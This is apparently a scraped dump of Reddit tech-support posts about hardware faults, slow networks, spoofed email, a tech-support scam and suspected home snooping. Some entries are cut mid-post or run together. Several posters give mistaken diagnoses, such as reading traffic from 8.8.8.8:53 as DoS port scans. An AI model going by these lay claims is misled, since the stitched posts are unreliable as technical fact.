1. Replaced the CMOS battery 5 times with new batteries because I was confident that it was related to CMOS battery and kept on thinking that the battery I bought maybe old and is malfunctioning. It turns out that it was not the issue. One day, I was totally frustrated after trying for some time and I had taken out the cmos battery and was clicking the power button many times. Then, suddenly the laptop turned on, on its own about 5 seconds after I stopped pressing the button.
2. Reflashed the BIOS with a new update. I thought it was due to corrupt bios, so I reflashed it. Nothing changed.
3. Tried changing RAM from another laptop, tried changing the HDD with SSD etc to see if those were the issues.
4. Tried powering on without the laptop battery, updated drivers etc.

I currently am using Windows 10. The only other issue with the laptop is that the laptop's keyboard pin holder's flap broke one time it was opened and so the keyboard doesn't work(This cannot be related to the current issue, but just mentioning).


At this point, I am not even sure if this has anything to do with the cmos or the flea power. It is like it randomly turns on when I press the power button, but the chances that it turns on increases exponentially if I follow the above process.

I am a very technical person and I can handle just about anything related to computers, so I am ready to do any advanced suggestions as well.

**Any help is highly appreciated.**

**Edit** - For those asking me to get a new laptop. I thought about it as well. I am a student from a developing country and all laptops costs 2X of what it costs in USA, plus due to the low currency exchange rates, imagine it to be like 15X the cost in US. 

I don't want to buy a low-end consumer laptop again and is currently saving up for a higher end laptop, but in the meantime I want this laptop to function, and would be glad if it can be repaired.

6uo8v4,Old unsupported gaming keypad software no longer works; can I save it with a 3rd party tool? (Keyboard rebinding?),"So, for almost 10 years I've used an [Ideazon Fang](https://images-na.ssl-images-amazon.com/images/I/51XBVJ4807L.jpg) for playing MMOs. Basically, it's a small USB keyboard that uses a piece of software called the [Z-Engine](http://static.trustedreviews.com/94/82cd0d/dc34/3288-1.jpg) to allow you to reprogram the keys individually, much like how the macro keys on a modern gaming keyboard work. There have been many similar things on the market since, but none with the same level of ergonomics and sheer number of keys. I love this thing, and whenever one dies I scour eBay until I find another one.

The Z-Engine was never a great piece of software (always buggy and slow), and when Ideazon was bought by SteelSeries several years ago support totally disappeared for the software. With the latest round of updates to Windows 10, it's finally stopped working altogether. It doesn't error out or anything, but it doesn't seem to recognize the keypad anymore, all profiles are gone, and it does nothing at all if you try to create a new one. Trying different installs (x32 vs x64) and compatibility modes doesn't help either. It's entirely useless.

Now, the keypad itself seems to work fine - it's just limited to its default key assignments. Windows seems to be treating it as if it's just any other USB keyboard. **So, is there a way I can rebind the keys for a secondary USB keyboard *without affecting my main keyboard* (a Corsair K95)?** I don't need any of the complex macro functionality of the original software (I never used it). All I need is some method of telling Windows ""Hey, when I press F1 on this second keyboard, what I really mean is the letter 'm'"" and that sort of thing. Being able to do multiple keys per key (for example, changing a Tab keypress to Shift+Q or something) would be ideal but not entirely necessary.

Really hope someone out there can help...I've been using this thing for so long I can't image how I'd get by without it, and I don't want this to be the end. :(


**UPDATE:** I've been trying this solution:

http://www.2112design.com/blog/multi-keyboard-remapper/

It works, but with a few flaws:

1. I can't rebind a key to a meta-key like Shift, Control, Alt, etc.
2. For some reason games aren't recognizing combined keystrokes (like Shift+I), even though it works fine outside of the game.
3. The editing process is balls.

The spammy emails I receive are spoofed to look like they come from me (but they don't, that's why Spam catches them). I email the admin of the email servers used, but the ""hacker"" keeps finding new servers to abuse. 

I've gone through all necessary steps to secure all my stuff, I don't have a PayPal account, I don't have any banking accounts linked to this, all my online accounts (Facebook and such) are linked to a different email address, I have no idea why he's so obsessed with me (it's been a week and it's still going on). Have to assume it's a case of mistaken identity.

Now, why is it that there is no way to prevent this from happening? How can someone keep doing this day after day and successfully blocks my incoming messages, to Google of all people?

So far, the only legitimate messages he could have been trying to hide have been password resets emails to this very Gmail account. WTF is he even trying to do? For one thing, inter-Google traffic still comes through so I do receive them, but even if I didn't, there's literally nothing he can do without access to this email. There is no suspicious login activity, all devices connected are mine, password has been changed, 2-step authentication is on and nothing has been sent to the phone used for it, or the alternate email address. I'm guessing he's somehow trying to abuse the ""recover my account"" tool. And I guess he is out-smarting Google at at least one thing: mail bombing Gmail accounts.

This has made talking to people on discord rather difficult since whenever he gets on the radio I'm forced to mute myself so my friends don't go deaf.

Is there any way i can stop this from happening? I was thinking that it might help if i buy a XLR mic and use it with the audio interface, but honestly I have no idea. Any help here would be greatly appreciated!

6q4x92,"Brand new TV, has preinstalled apps like facebook that I can not delete, and neither can Samsung, I was told the contract with facebook overrules any desire I have to remove the app, is there any way to remove these apps or do I have to return the TV?","TV - Samsung Series 8 flat model MU8000

So to start, I am fairly tech savvy but no expert. I tried going in setting and deleting and all the regular routes that are suggested in manual.online. Followed by calls to samsung tech support. 

So the TV's home is filled with apps, no big deal just like a phone remove what you do not like, right? Nope. After an hour with samsung customer service I found there is no way for me to remove the app or dozens others. So I do not like facebook and would delete it out of principle, but that is not the issue here.

Every time you hit home, it brings up every single app on the TV along with input choices such as HDMI or cable, etc. So when I went to streamline MY TV that I just spent over a grand on, it was kind of annoying to find out I can not delete it. Instead of having say 4 option in my home (netflix,tv,HDMI,amazon video) so it is easy to flip back and forth, I have to dig through dozens of apps that I can not remove. After facebook I found the MLB channel is not able to be deleted, along with every other app from a company samsung apparently made a contract with.

How is this different than forcing advertising upon my TV? I have to see those app icons no matter what, I have to scroll through them wasting my time no matter what?

Not to mention, say I am watching a movie and now it suddenly is slow, well that is because an app I do not want is updating in the background while I am trying to watch Netflix. These app companies have access to my TV, all of them, and I can not stop it just because samsung got money to put the apps on the TV? We know how often hacks happen and as a smart TV is has credit information and more about me. I do not trust a couple dozen random companies to never abuse my data, much less why should facebook know what I watch?
I was told by samsung if I do not like the apps to buy an older TV that does not have this option, but it has less specs as well, this is not reasonable to me.

He said that It died a few months ago. No power. He replaced the PSU and everything worked for a while. Last week it died again, so he swapped the PSU again but got nothing this time.

So he gave it to me. I reset the CMOS and unplug everything from the PC and it boots. So I add the memory and plug in the HDD. To my dismay the HDD doesn't even spin up. I try plugging in the graphics card and I hear a small discharge sound and the PC wont power. So I unplug the card, reset cmos and boot the PC back upStill no HDD. I try 2 of a recent shipment of 2TB barracuda sata drives. Neither work. I decided to try a old WD from a dead PC of mine and it starts crackling and smoking. I kill power to the PSU and unplug the HDD. I figure I have a bad board.

I replace it with an MSI M3. It is not only not recognizing the same HDDs, but I cant boot up with any sticks of memory with the exception of having sticks in both the 3 and 4 slots.

6naa25,"My internet speed is terrible but only on ONE computer, and only the download speed. I'm not a noob and I'm seriously going to lose my mind if I have to wait for one more JPEG to slowly load one line at a time.","I've posted about this twice already on here and had no luck. So please, if you can find it in your heart to spare me an upvote, and look past my skirting of the reddit moral code by asking, I would greatly appreciate some more input on this situation before I completely lose it and start ripping cables out of the wall.

So one day, months ago, for no good reason, with no big changes to my internet connection or network environment, my desktop computer started getting a really bad download speed. When I say really bad, I mean less than 1Mb per second.

Like, JPEGs load line-by-line, YouTube videos will buffer constantly unless they're in 360p, and Facebook takes 5 full seconds to load, slow.

Before this day, my speeds were fine. There's no good reason for my download speed to be that slow. The only thing I can think of that coincides with this event is that the house next to me was having some construction done, and the cable that runs from the ""ISP box"" to my house runs across that property. But I don't think there's any way that had anything to do with it, because no other devices in the house have this problem.

Here's some bullet points about the situation.

* I built this computer a few summers ago, and it's been performing great so far. It's got good specs, and I can list them when I get home.

* The computer is in the basement, and it doesn't have a built in wireless card. The router and modem are on the main floor (one floor up and one room to the left). I'm using a WLAN stick in the computer. This one, to be exact: https://www.asus.com/us/Networking/USBAC56/HelpDesk_Manual/

* The router is a Google OnHub TP-Link router. This one: http://www.tp-link.com/us/products/details/cat-9_TGR1900.html

* The modem is a standard one that my ISP ""gave"" us. I tried using the modem's built-in WiFi network, but it has the exact same speed from this computer, and a good speed from the other devices. I can get you the model and name of the modem if that's important, but I really don't think it is in this case.

* When I do a speed test on any other device in the house, I get roughly 25Mb/s down, and 10Mb/s up.

* When I do a speed test on my desktop computer, it USED to give me the same speed as all the other devices, but after that random, fateful day, I've been getting at MOST 3Mb/s, and very often under 1Mb/s. The weirdest part is that the upload speed is great: almost always staying at a consistent 10Mb/s.

Things I have tried so far:

* I finally lugged my computer upstairs yesterday and plugged it into the modem directly via ethernet, and...boom. 25Mb/s down. I know, I know, ""OH IT'S THE STICK, GET A NEW WLAN RECEIVER"", but no, it's not the stick. I tried the stick in my other devices and it gets a great speed. It's not a cheap stick, nor is it broken. And yes, I have updated the drivers for the stick.

* YES, I have tried turning it off and on again. I've tried turning literally every piece of this puzzle off and on again. I've reset the router and the modem to factory settings, I've turned my computer off and on again. I've uninstalled the drivers for the WLAN stick and re-installed them, and checked for updates for the drivers. Nothing. Still caveman speeds. I have not yet wiped Windows and started fresh, but that's probably my next step.

* I have run several virus scans. Nothing.

* I've Googled tons of things like ""bad download speed good upload speed"", ""bad internet speed on one device"" and ""why is my internet so slow"" and I've perused fruitlessly through dozens of old, 2005-esque tech forums. There was one thing that was hopeful, where a bunch of people said a program called ""AMD Quick Stream"" was throttling their speeds, but that program isn't on my computer.

* I downloaded a WiFi channel analyzer thing, and the network is fine, and it's getting 5 stars on everything, even from the slow speed computer.

* I used PingPlotter and it said that on the first two hops (pinging Google), there was almost 50% packet loss, then it drops to 36% on the third hop, and then 0ish% on the rest of them. At least I think that's what it was when I checked last night. I'll check again tonight. I think that ~46-49% packet loss is fairly significant, but I couldn't see any way to figure out why it's happening or how to fix that when I researched it. I'll post a screenshot later.

I'm honestly out of ideas at this point. Getting a powerline adapter would probably work *alright*, but I'd rather not go that route, because my house is very old and when I tried it a couple years ago, the speed was almost halved by the time it got to the outlet in the basement. I'm also starved for outlets in my room. When the WLAN stick was working well, I had a fantastic speed.

I just want to not wait 20 minutes for a 10MB zip file to download any more. I've been using my computer less and less because of this and I'm sick of trying to troubleshoot.

I'm at work right now, but I can try your suggestions in a few hours.

I'll love you forever if you can offer a suggestion that I haven't mentioned above, or if you can ask for more information or specs or numbers or names, or if you can give me Tim Berners-Lee's personal number, or if you can just send prayers and good vibes.

Thank you.

**EDIT**: Okay, going through the suggestions now in order of easiest to hardest now. Thanks so much to everyone who replied!

* I tried all the ports (USB 2 and USB 3), still shit speeds :(

* I tried removing the device driver completely and then plugging it back in and letting it install itself again, no dice

* I tried ""netsh winsock reset"", no luck

* I'm in the middle of trying to do a speed test from a Linux USB. Struggling to get the Linux drivers for the WLAN stick installed. 

* **EDIT** ^ FUCK LINUX. I'm sorry, but I could not for the life of me get those drivers installed on Linux.

There's no recent ones of him on my iPhone 6+ and i tried googling it but there's no direct answer. I have AT&amp;T. No answers there either. I did back my phone up occasionally to iTunes on my PC. There were several softwares offered while I was researching that said they can recover it from a backup but not sure if any are reliable. I'm not tech illiterate but I'm not exactly savvy either so sorry if I sound clueless. I am actually. Does anyone know if there's a way to find voicemail that might be saved on my iTunes back up somewhere? Or if any of these software are reliable? Thanks ahead for any advice.

6kiw0o,"Cable tech left without telling me what he found. Internet is still slow. Found his notes: ""srn dropped on card once."" What does that mean?","If it matters, here is some context.

I have Internet through Mediacom. I'm supposed to get 200 Mbps, but typically get under 50--often under 5.

After several calls and visits, Mediacom's techs are just less and helpful. Last time, the phone rep said she'd run a test that showed there was a problem with the line in my yard (which seemed realistic, because it had recently been cut by a neighbor digging--it was supposedly fixed since then, but I wasn't surprised to here there were still problems).

The tech arrived and began working outside without notifying me. No big deal, since the work would likely be all outside, due to the bad line. But then the tech also left without talking to me to tell me what he found, and the problem still persists. 

Mediacom puts me in a loop when I call, but I was able to find some notes from the tech on my account that say ""SRN DROPPED ON CARD ONCE."" 

Does that mean anything? I just thought if I had some idea of what the test showed, that would give me a foothold to actually get some help from Mediacom.",https://www.reddit.com/r/techsupport/comments/6kiw0o/cable_tech_left_without_telling_me_what_he_found/,1498857379.0,60,0.95,58,techsupport,ArthurGordonPymp
6k92co,Personal text message sent to my boyfriend was also sent to a random stranger in a different state who was not in my contacts list,"On Monday, I sent my boyfriend a personal text message and he received it and replied, but at the same exact same 
time the text message was sent to him, it was also sent to a stranger in another state who was not in my contacts list. 

I got a random text from this stranger asking shortly after sending my boyfriend this text asking, ""Who is this?"" I asked her, ""Who is this?"" She told me her name and I asked how she got my number and she replied, ""I just got a text from you I don't have your # saved, Do I know you?"" I responded, ""I've never sent a text to this number, what did it say?"" and she sent me the screenshot of me texting her the exact thing I sent to my boyfriend at the exact time I sent it to him. This duplicated text that was showing to be sent to her number never showed up on my phone.

My boyfriend and this stranger both have Androids and I have an Iphone7. Has this ever happened to anyone? Does anyone know what may have caused this problem? I'm kind of scared to send my friends texts now out of fear that the message may be sent to someone else at the same time without me knowing. I found this subreddit and thought it would be the appropriate place to ask this question because I can't seem to find anything on Google.

6isu2o,My PC gets tired and needs to lie down every now and then. Weirdest problem I've ever had,"I've had this issue for a while now (about a year) and, pretty much, gave up trying to find the root cause because I can fix it with a workaround.

It's old (5-7 years) PC running Windows 7.  ASUS P755B mobo, bog standard RAM, Nvidia 980 gfx card.  Mini-tower case.  Nothing overly special about it.

However, every now and then, applications will just fail to start.  I mean...anything at all - Word, Task Manager, Powershell, any game.  Anything.  If I cold-reboot it, Windows will start but then give me a black screen after logging on.

The solution?  Turn the PC off, lay the PC on its side, leave it 5 minutes and restart it.  Hey presto, everything works again!

The only thing I can suspect is the 980 gfx card.  It's pretty heavy and, being a minitower case, I have sneaking suspicion that after a while the weight of the card somehow pulls it out of the PCI slot slightly.  Quite why that would stop any applications from starting I have no idea.

I plan to replace the whole rig in a few months anyway but just wondered if anyone has experienced anything like this before

*Update 1:  OK, so after all the excellent advice I'm going to, first, try running it on its side with the case closed for a week or so and see how it goes.  Temps looks OK on the CPU (hovering about 60c but it's REALLY hot here at the moment so that's not helping).  Managed to prop the case up with some books so that I can, at least, access the USB slots and power switch.  I usually hibernate the thing anyway so only ever need to press a key/move the mouse to start it up again.*

*Fingers crossed (and time to start pricing up a new rig!)*

*Update 2: So, yeah, got myself some compressed air and took a look at the heatsink fan.  Nice thick layer of dust!  So much so that I couldn't see the inside of it.  Study now looks like someone set off of a dust bomb.

6b21a3,"If a VPN is housed in a country with copyright laws such as America, does that mean the owner of the VPN gets piracy emails and settlement demands from their ISP because they are the endpoint for pirates?","I am a little confused on one particular aspect of a VPN.  A lot of people talk about it as a way of protecting themselves from strict copyright laws and piracy notices.  I know VPNs reroute your entire network traffic through another network.  And I know they encrypt the data between your device, and the endpoint.  But as far as I understand it, the data that goes in and out of the VPN server is not encrypted.  

So wouldn't that mean that the anti-piracy firms that log IP addresses connected to trackers, would see the IP of your VPN, and send the VPN, and the ISP that the VPN server uses, an anti-piracy notice or a settlement demand?

Basically, are VPN servers responsible for the traffic that flows through them, and does it behave as normal detectable traffic?",https://www.reddit.com/r/techsupport/comments/6b21a3/if_a_vpn_is_housed_in_a_country_with_copyright/,1494733913.0,81,0.97,10,techsupport,Reacher_Said_Nothing
6au57h,"The same phone number calls me 200 times a day. They say nothing and hang up after a few seconds. Via text message, the phone's owner is claiming that I'm calling her. This has been going on for 2 weeks now.","I added her number to the block list ages ago, but [it still informs me every time she calls](http://i.imgur.com/PacriDf.jpg). Unfortunately she's a cranky old woman who seems to be convinced I'm calling her for nefarious purposes, so she's not really cooperating and explaining her half of the story. But I think both of us are victims and something weird is happening with our numbers. Notably, our numbers have the same area code and are extremely similar to each other (the only difference is mine ends in 227 and hers ends in 141). Anyone heard of something like this?

I called her about a week ago to try and sort this out, she demanded to know why I was calling her all the time, I tried to explain that I wasn't, she asked where I lived, and after I answered with my city and state she hung up. So I kinda gave up on talking to her until she texted me two days ago: 

**Her two days ago**: Why do you not call back like you say on your message machine?

**Her**: Weird you are right. I am very well experienced in this line of work, i feel very sure you don't know what you are doing , i do not have to ask for help y

**Her**: ou need the help. Where do you live?

**Me**: &lt;city, state&gt;. I'd be happy to work with you to resolve the issue if you are experienced in such things. Your number calls me 200 times a day.

Update: After further text conversation with her, she's started forgetting earlier parts of our conversation, making it clear she's a scammer of some sort.

Today I noticed the most odd behaviour of my GPU that I have ever seen and I can not explain just why this happens.

Whenever I move my cursor on the Desktop (It has to be on the desktop, no window open), my GPU usage jumps to 30%. This doesn't happen when I have any window open.

as long as I keep the cursor inside a window, everything is normal. The moment I touch the desktop, say moving the cursor outside of a window, bam, 30%.

Now recently I'm starting to need several Android emulators due to some projects, and I have to customize and set up each one very carefully. I already did that on my PC, but I'll also need it at home.

So I figured that maybe I could install and set up everything on my external HDD (WD Elements 500 GB), and just plug it into my computer/laptop/anywhere, whenever I need to do my thing. That way I don't have to do the whole process on each computer I work on (sometimes I'm at libraries, or use a colleagues laptop).

**TL;DR** Can I install Nox on my external HDD in such way that I can just plug-and-play it from any computer I work on, with all the customization remaining the way I set it up?

We usually get along, but we're very different people and disagree a lot. Recently we got into a fight, and she brought up something I'd said in a private online conversation. She later admitted to reading the message, but didn't say how. 

Her boyfriend, who works in IT, also lives with us, and controls the router. He's changed all the passwords from the default passwords. Could he be using that? At first I thought she just logged into my pc, but I haven't accessed that particular account on the messaging site in a very long time, and I can't think of any way she would have known to look for it. 

And recently I've noticed if I mention something about them in private or anonymous messages, she seems to get moody and ignore me. I've always thought that she just got a bit depressed or angry sometimes, but I tested it recently and the next day she seemed angry for no reason? 

super confused, and as privacy and trust is something really important to me, I'd like to know if I'm being paranoid or if I should try and talk to her

**Problem**

Despite having installed 4x4GB RAM, ""This PC&gt;Properties"" only shows 8GB RAM installed. In BIOS, I can see all four sticks, each with a unique serial number. CPU-Z also reports 16GB memory. Occasionally, the computer fails to reboot a few times before succeeding.

**List anything you've done in attempt to diagnose or fix the problem.**

1. I first removed all my RAM, and then tested each of the four sticks one at a time in slot 1, booting into Windows each time. All sticks worked fine. 

1. I took one stick and tried it in each of the 4 slots, all slots worked fine. 

1. I added sticks in both blue slots, but none in the black slots. This worked fine, and Windows reported 8 GB RAM installed.

1. I attempted to put one stick in a blue slot, and one stick in a black slot. This prevented my computer from booting at all, completely black screen.

1. I added sticks in both black slots, none in the blue slots. This worked fine, Windows reported 8GB RAM.

1. I added all four sticks. Windows boots, but only reports 8GB RAM.

1. I went into my BIOS settings and changed memory frequency from ""auto"" to ""1600 MHz"", Windows still reports 8GB RAM.

1. I toggled the ""EPU"" (some kind of energy saving mode) switch on the motherboard, this didn't change anything. I did the same with the ""TPU"" (some kind of turbo mode) switch on the motherboard, no change.

65iiol,"TIFU, promised to repair a family computer, quickly bricks itself and no longer posts. no bios, nothing","EDIT: hey people from /r/techsupport. Before you waste your time trying to help out, I ended up bricking the computer. There is nothing I can do. Guess I officially belong to /r/techsupportgore now.

**Introduction**

today I promised to repair a family computer. They told me it had a ""virus"" and that it was doing ""weird things"". So they gave me the computer for me to take a look at. I don't really know what computer this is exactly, which is making this really hard for me. It's the HP pavilion G7-xxxx xx. but I have no idea which one.

**Main ordeal**

When I first investigated the computer I already noticed that it was literally riddled with malware, so my first instinctive reaction was to download malwarebytes and restart in safe mode. 

When I rebooted the computer with the safe mode setting turned on all I got was a black screen. 
Safe mode is literally the LAST thing that should brick a computer, so something else here is at play.

I have no way to enter the bios, pressing the delete key upon bootup gives me nothing. There is no splash screen either. My theory is that a piece of malware somehow bricked the computer when it noticed I turned on safe mode. It would have to be very deeply embedded in the system, like a rootkit. This is very rare though, so I don't know if that's what happened.

It was working ""fine"" until I touched it .-.

**More information**

I took out the hard disk, and I found all the data was still intact. I get a ""different"" darker black screen if I take out the ram, so that's all I can do to verify that the ram is working.

The hard disk has a partition called HP_TOOLS, so I googled this. Apparently there is a way to recover your bios if it is somehow damaged. All you have to do is press windows+g. I tried this, but all it does is ramp up the fans. You can also do this from a USB, but I've had no luck since I have no idea what model computer this is. I did try a random pavilion G7 bios and USB activity LED did indeed turn on, but I don't get anything on screen.

Connecting an external display through hdmi also doesn't give me anything

please help

UPDATE: just disassembled the entire computer in order to unplug the cmos battery.
lets see what happens next

UPDATE 1.5: I cut myself trying to disassemble this thing. HP really enjoys making it a pain in the dick to open their products up...

UPDATE 2: I reassembled the computer but it's no longer turning on at all. like, no power. I think I messed something up. This is surprising to me since I follow an instruction manual. I think I'm calling it quits. It's been a fun ride... Rest in peace HP laptop. Not that it really matters, the difference between bricked and dead is neglectible.

UPDATE 3: i'm sorry ... I marked it as completed becuase I've given up on the sodding laptop. Feel free to give suggestions but I don't think there's anything that hasn't been said.

CALL THIS NUMBER PLS"" popups and how you absolutely never call them? Well, my buddy Dan did. They charged him 200 bucks on his credit card and he gave them remote access.

Then his girlfriend was like ""God damn it Dan."" and she called the ""real"" microsoft, and they charged her another $180 for virus protection for 6 months and she gave them remote access as well. I mean, even if this is legit, that is insane to pay that much.

Anyone know of microsoft virus protection thats $180 for 6 months?

It should be noted, we're canadian.

EDIT: I've taken a look at what was going on. Lots of spyware bullshit. They told me it was windows 10. It was windows 7 so i didnt do much. Just deleted the appropriate programs for now. Gonna head back and do a full wipe soon. They offered to pay me 200 bucks, so that was awful nice of them.

Turns out the second payment was with paypal. She's calling paypal today. Its unlikely she'll see the money back.

EDIT2: Pay pal did not help them. Their credit card company did. So they got some money back from it. We've formatted the system.

64njl4,Rogue IP hijacking all Apple devices in the house sending enough DoS attacks to throttle our network and double our data usage...wtf?,"I'm hoping to find some help here, please direct me to anything else that might be helpful.  I'm not terribly tech literate but I can generally get around, this one has me stumped however.  Here's a play by play of the last month.

1. Not sure if this is related BUT timelinewise, it coincides with what's happening at home. The week of Valentine's, I was in the hospital giving birth. I don't recall, but I believe my iPhone picked up the hospital's wifi.  On the 2nd or 3rd day there, I got a bizarre notification I hadn't seen or heard before. Unfortunately, I do not remember what it was thanks to the drugs and lack of sleep, but I think it had something to do with location services. And whatever it was made me suspicious that someone was trying to mess with my Apple ID and find my phone so I immediately changed the password and turned off wifi altogether.

2. Fast forward to middle of March, I get a notification from Comcast that I was nearing my 1TB data plan limit on my home internet. I wasn't even aware I had a limit and quickly found out, that we only average about 7-800gb a month with the plethora of devices we have connected. But 10-15 days into the month, I was already nearing 1tb.  I thought it was because I was watching a lot of streaming tv on my iPad recently since I was suddenly chained to the couch with a newborn, but stopping that did not make a difference.  Plus, February was a bit high considering we weren't even home for a week of it. We finished March having used 1,896gb of data. Luckily we didn't have to pay overages thanks to 2 courtesy months Comcast apparently included with this plan I didn't know I had. I should also note that our connection was awful...kept dropping every 5 minutes and just slow as molasses across the board, all month.

3. My knee jerk reaction was that some shithead in the neighborhood broke into our network. I logged into our router (Netgear Nighthawk C7000), and started verifying all the attached devices.  All checked out, no unknown machines. 

4. After pulling my hair out for a while, I realized 3 things. 1) there was an awful LOT of DoS attacks (ping of death, derivatives, etc), just rapid fire one after the other. 2) they were all coming from a strange IP address in another state. And 3) this rogue  IP address was jumping Apple devices.  One minute it was my iPhone, the next my husband's, kids', my iPad, and back to my phone.  The device did not even have to be in use since I noticed my husband's was sending attacks while he was asleep.

5. I checked the IP's on the devices as I was watching the attacks roll in on the log. The router was listing the foreign IP on the known device while the device itself still showed its assigned IP address in settings. 

6. I've googled the fucking shit out of this and have found several EXACT situations with no resolution.

7. The only fix I've been able to come up with to keep the data under control until we figure this out, is to shut off wifi on all the Apple devices in the house since the other devices don't seem to be affected by this rogue IP address.  We are back to a more normal average daily usage so far, but still a bit high considering 5 of our 13 devices are essentially blocked right now. Connectivity is back and as good as it was right before the data spike.

Here is what I've tried with zero success:

1. changed admin and wifi password on the router
2. Turned on access control and blocked all new connections
3. Called Apple
4. Did the suggested system restore to wipe the OS and reinstall it...rogue IP hijacked the device within seconds and resumed rapid fire attacks until I re-blocked.
5. Called Comcast
6. Did the suggested unplugging of the modem/router, several times ranging from 5 minutes to several hours in order to get a new IP address...that I can tell, it hasn't changed
7. Released/renewed IP on devices and the router console, no change.
8. I tried to block the rogue IP but got a message saying it was invalid. 
9. Checked the firmware of the router...I can't change it because the updates get pushed through Comcast apparently. Either way, it's up to date.

I'm probably forgetting a few things but I'm tapped out of ideas.  Anybody else heard of this? Is the solution really to get a whole new router/modem (different brand)?  That's the closest I've seen to a solution but there was zero follow up on whether that worked or not for the ones frustrated enough to buy new equipment.  

The only thing I haven't tried that I can think of, is going to the Apple Store to see if they can tell if I picked something up at the hospital that was able to jump onto the other Apple devices in the house. The Apple tech on the phone was pretty confident that it would be a waste of time because they wouldn't be able to tell.

Help.


EDIT  - Figured I'd actually post my solution since I never came across one in the search for what this was.

So I bought a firewall and it has been functional a little over 48 hours now. It appears to be working though it's not reporting any failed attempts from the outside. My phone has had its wifi turned on for 2 days and the very last attack on the log, was literally a few minutes before the firewall was functional lol.  In fact, the additional odd chatter I was seeing is gone as well and my data usage dropped significantly, even compared to when I blocked the 5 Apple devices for a couple weeks. There must have been more going on than I was noticing or focusing on.

Anyway, all appears well. The only strange thing that I'm seeing is periodic DoS attacks (port scans) from 8.8.8.8:53...which is google right?  I haven't done the research to find out what that's about yet but worse case I figure I can contact them and ask.

I just want to thank everyone who took the time to read my original post and tried to decipher my ramblings lol.  And thank you for all the replies, I learned some stuff and it was cool. I wish I could have gotten to the root of the problem so I could've understood what the hell was going on, but I'd be lying if I said I wasn't glad throwing a little money at it ""magically"" made it stop...I have 4 kids aged 15 to 8 weeks, I have a house to run, a design business to get back to, and literally no time for shenanigans lol.

64l2fi,How to find out if my bro has hacked my pc and spying on me?,"So I came back from another city and my pc was on and he'd left the browser history windows open and there was a download of recuva.    He had gone through everything I searched for and even had a few of my porn folders opened.    A pretty dick move since he left it open knowing I would know that he did it.   

Honestly I don't give a fuck but I want to ensure he's not spying on me now.   He's relatively tech savvy and I've already reset the router and set a password for my pc.   I downloaded a process Explorer and I didn't find any weird keylogger ish stuff.   I looked up firewall settings and the only weird thing I found was an inbound and outbound rule for a ""camv2""   but I'm pretty sure that's from when a program I installed, a hardware monitor for fps in games.   I don't know why it was still there since I had Uninstalled it but I disabled that as well.     

Is there anything else I could check?   There are no new programs installed even with hidden  folders shown.      


I'm not that angry since he did pay for the PC.  He's 26 and I'm 21 but a breach of privacy is still a breach of privacy.   I could understand if I was like 13 and he wanted to ensure I wasn't watching some weird shit but.. Whatever.   

The reason I think he's bugged me is that he's asked me to install a keylogger on my dad's laptop a few years back when we suspected him of cheating/some other stuff.   He told me ""hack it,  install a keylogger""   

 so I know he's got no qualms on doing the same for me. 

So tell me how I can find out if there's some thing on my pc.   I could do a re-install but that's too much data I would lose and I don't have an external drive to back my shit ton of data to.",https://www.reddit.com/r/techsupport/comments/64l2fi/how_to_find_out_if_my_bro_has_hacked_my_pc_and/,1491845980.0,95,0.96,66,techsupport,whatareavocados

5yyx4y,Computer slowly commited suicide.,"Hello. I'll go straight to the point:

I was playing, doing nothing special, and Windows froze (windows 10). I didn't think much of it, since it was an unregistered copy to see if it was worth upgrading from W7, so I thought it was just normal from a non-original windows version.

The thing is, after restarting the computer (had to do a hard shutdown holding the power button), it just started freezing more often and faster after booting Windows. I still thought nothign of it and was all like ""eh, I'll just reinstall windows 10 and call it a day"".

The thing is, after reinstalling I started getting a bunch of BSODs, which is BAD if you have a fresh windows install. Same thing happened after going back to my original W7.

It kept getting worse and worse, I thought it was a problem with my HDD (I have windows on an SSD and the HDD for the rest of stuff), so I removed them, and left only the SSD. After this, nothing worked anymore. My computer's speaker stopped beeping and instead started doing some weird clicking sound, after trying to do a minimal boot (one ram stick, no gpu or hdd/ssd...), the computer booted up, shut down for 2 seconds then boot again, but didn't get to the BIOS/POST. I restarted the bios (removing the battery and such), and solved the double boot, but nothing else.

I tried leaving everything plugged (all HDDs, SSD, GPU...), but nothing. Clicking sound on the motherboard's speaker, not getting into the BIOS (screen doesn't receive signal from the integrated graphics or the gpu's).

The only thing I got once was a long beep followed by 3 short beeps for some reason in the process, but couldn't replicate it. My motherboard is a Gigabyte B85-HD3.

Any help is welcome. Thanks.

After fiddling with some settings, we managed to get rid of them. But tonight, they are back again!

Under performace, it shows Mbps at anywhere from 8 to 16Mbps at all times, so i dont know where all of the data is getting lost. Im not tech-illiterate and can usually find and fix most of my own problems with computers - this is the first time ive ever gotten desperate enough to go to a forum for help. I'll be editing this post regularly to add any info i can think of that may be relevent.

Speed test gives me 6.83 Mbps just now

Just now steam is actually dropping to like 800 kb/s, but that's never happened before, and im fairly convinced that their servers are just maxed out atm as the preload of wildlands is available, and the beta was amazing. (hint hint nudge nudge, im trying to download that too at the minute, but im not trying to make that take 16 hours - though regardless of this one game, this download speed issue has been long standing and i need it fixed, im out of patience)

this issue persists with wireless or wired connection

Edit: After a suggestion i found online, i reinstalled my network adapter/drivers and the average speed changed from 1.1 to 1.5, which is already infinitely better, however im a greedy and would love to get the speeds i pay for if at all possible. However as i said, steam servers are probably busy as hell since Wildlands goes live in like 4 hours, so for all i know it is fixed now but steam just cant supply more speed, in theory. Regardless a 12 hour estimated download time has shrunk to 7 hours already. It's sat at 1.5 for the last 10 or so minutes and even climbed to 1.6 for a bit. however it is also dipping to 1.3, but never for longer than a second, and never more frequently than once every 10 seconds.

Edit: The purchase of an SSD increased the average download to about 2 per second.

5vz1y1,What is the most cost effective and reliable way to backup 20TB of photos/videos?,"My girlfriend is a photographer, and she currently has 14TB (and rising) of personal photos, assets for clients, and videos. I sat down with her to try and clean up her files because ""that didn't seem right"", but I was dead wrong. She has tons and tons of media.

Right now she has a WD MyBook Duo and completely maxed it out, without any sort of RAID.

She has a few thousand dollars to spend on a more reliable backup solution, but I'm not sure how to guide her since she's pretty uneducated on the topic. We were thinking that she's going to need at least 20TB to grow into, and to double that for any sort of RAID configuration. So 40ish TB is the working number we have right now.

She currently has an iMac and a MacBook Air, and would like to access her files from both of them, but doesn't mind using wires if a wireless solution is off the tables.

So guys, I hope you can help me figure out a solution to help her, as her data is really vulnerable right now and it would absolutely cripple her career to lose it.

should she split it up into two drives (one higher speed transfer, and one slower one for longer term storage and time machine)?

should she get one massive 8 bay drive solution ( a la pegasus or G-tech)?

Would she be better off using a cloud solution?

I know of most of her options at this point, but I'm hoping to hear from people with first hand experience with what works most efficiently and cost-effectively.

- re-installed windows 10
